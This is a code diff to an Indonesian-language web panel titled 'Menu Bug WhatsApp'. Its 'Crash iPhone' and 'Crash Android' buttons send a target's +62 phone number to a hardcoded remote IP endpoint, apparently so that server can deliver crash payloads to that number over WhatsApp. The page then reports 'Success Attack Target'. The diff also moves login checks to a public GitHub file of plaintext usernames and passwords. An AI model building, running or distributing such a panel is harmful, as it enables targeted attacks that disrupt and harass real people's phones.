@@ -14,6 +14,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
+      flex-direction: column;
     }
     .container {
       background: rgba(15, 15, 15, 0.85);
@@ -55,19 +56,21 @@
 </head>
 <body>
 
+<!-- Login -->
 <div class="container" id="loginPage">
   <h2>🔐 Login ke XZET</h2>
   <input id="username" class="input" type="text" placeholder="Username" />
   <input id="password" class="input" type="password" placeholder="Password" />
   <button onclick="login()">Login</button>
-  <p id="errorMsg" style="color:red; margin-top:10px;"></p>
+  <p id="errorMsg" style="color:red;margin-top:10px;"></p>
 </div>
 
+<!-- Menu -->
 <div class="container hidden" id="menuPage">
   <h2>💥 Menu Bug WhatsApp</h2>
   <input id="target" class="input" type="text" placeholder="Masukkan nomor target 62xxxx" />
   <button onclick="sendBug('ios')">Crash iPhone</button>
-  <button onclick="sendBug('andros')">Crash Android</button>
+  <button onclick="sendBug('android')">Crash Android</button>
   <div class="marquee-wrapper">
     <marquee behavior="scroll" direction="left" scrollamount="4">
       Thanks To : BancetMyself - And My God - And My Family
@@ -75,66 +78,90 @@
   </div>
 </div>
 
+<!-- Success -->
+<div class="container hidden" id="successPage">
+  <div id="successContent"></div>
+  <button onclick="showPage('menuPage')">🔙 Back to Menu</button>
+</div>
+
+<!-- Logout + Links -->
 <div class="logout-btn hidden" id="logoutBtn">
   <button onclick="logout()">Logout</button>
 </div>
-
-<div class="bottom-links hidden" id="bottomLinks">
+<div class="bottom-links hidden" id="links">
   <a href="https://t.me/BancetMyself" target="_blank"><button>👑 Owner</button></a>
   <a href="https://t.me/SecretMInformation" target="_blank"><button>📣 Channel</button></a>
 </div>
 
 <script>
-async function login() {
-  const u = document.getElementById('username').value.trim();
-  const p = document.getElementById('password').value.trim();
-  const err = document.getElementById('errorMsg');
+  const USERS_URL = "https://raw.githubusercontent.com/ZauzetGithab/XzetVictus/main/users.json"; 
+  // Ganti USERNAME & REPO dengan repo GitHub public lu
 
-  try {
-    const res = await fetch('/api/getUsers'); // lewat API biar aman
-    const users = await res.json();
-    const found = users.find(x => x.username === u && x.password === p);
-    if (found) {
-      localStorage.setItem('loggedIn', 'true');
-      showMenu();
-    } else {
-      err.textContent = '❌ Username atau password salah!';
+  async function login() {
+    const u = document.getElementById("username").value.trim();
+    const p = document.getElementById("password").value.trim();
+    const err = document.getElementById("errorMsg");
+
+    try {
+      const res = await fetch(USERS_URL);
+      if (!res.ok) throw new Error("Gagal ambil data");
+      const users = await res.json();
+      const match = users.find(user => user.username === u && user.password === p);
+
+      if (match) {
+        localStorage.setItem("loggedIn", "true");
+        showPage("menuPage");
+        document.getElementById("logoutBtn").classList.remove("hidden");
+        document.getElementById("links").classList.remove("hidden");
+      } else {
+        err.textContent = "❌ Username atau password salah!";
+      }
+    } catch {
+      err.textContent = "❗ Gagal mengambil data pengguna!";
     }
-  } catch(e) {
-    err.textContent = '❗ Gagal mengambil data user!';
   }
-}
 
-function showMenu() {
-  document.getElementById('loginPage').classList.add('hidden');
-  document.getElementById('menuPage').classList.remove('hidden');
-  document.getElementById('logoutBtn').classList.remove('hidden');
-  document.getElementById('bottomLinks').classList.remove('hidden');
-}
-
-function logout() {
-  localStorage.removeItem('loggedIn');
-  location.reload();
-}
-
-async function sendBug(mode) {
-  const target = document.getElementById('target').value.trim();
-  if (!target.startsWith('62')) return alert('Nomor harus diawali 62xxxx');
-
-  try {
-    const res = await fetch(`http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`);
-    if (res.ok) alert(`Success attack target: ${target} [${mode}]`);
-    else alert('Gagal kirim bug!');
-  } catch {
-    alert('Error kirim bug!');
+  function logout() {
+    localStorage.removeItem("loggedIn");
+    location.reload();
   }
-}
 
-window.onload = () => {
-  if (localStorage.getItem('loggedIn') === 'true') {
-    showMenu();
+  function showPage(page) {
+    ["loginPage","menuPage","successPage"].forEach(id => 
+      document.getElementById(id).classList.add("hidden"));
+    document.getElementById(page).classList.remove("hidden");
   }
-};
+
+  async function sendBug(type) {
+    const target = document.getElementById("target").value.trim();
+    if (!target.startsWith("62")) return alert("Nomor harus diawali 62");
+    
+    const today = new Date();
+    const tgl = `${today.getDate()} ${today.toLocaleString('id-ID',{month:'long'})} ${today.getFullYear()}`;
+    const mode = type === "ios" ? "ios" : "andros";
+    const bugType = type === "ios" ? "Crash iPhone" : "Crash Android";
+
+    try {
+      await fetch(`http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`);
+      document.getElementById("successContent").innerHTML = `
+        ✅ <b>Success Attack Target</b><br>
+        📱 <b>Target:</b> ${target}<br>
+        🐞 <b>Bug Type:</b> ${bugType}<br>
+        📅 <b>Date:</b> ${tgl}
+      `;
+      showPage("successPage");
+    } catch {
+      alert("Gagal kirim bug!");
+    }
+  }
+
+  window.onload = () => {
+    if (localStorage.getItem("loggedIn") === "true") {
+      showPage("menuPage");
+      document.getElementById("logoutBtn").classList.remove("hidden");
+      document.getElementById("links").classList.remove("hidden");
+    }
+  };
 </script>
 
 </body>
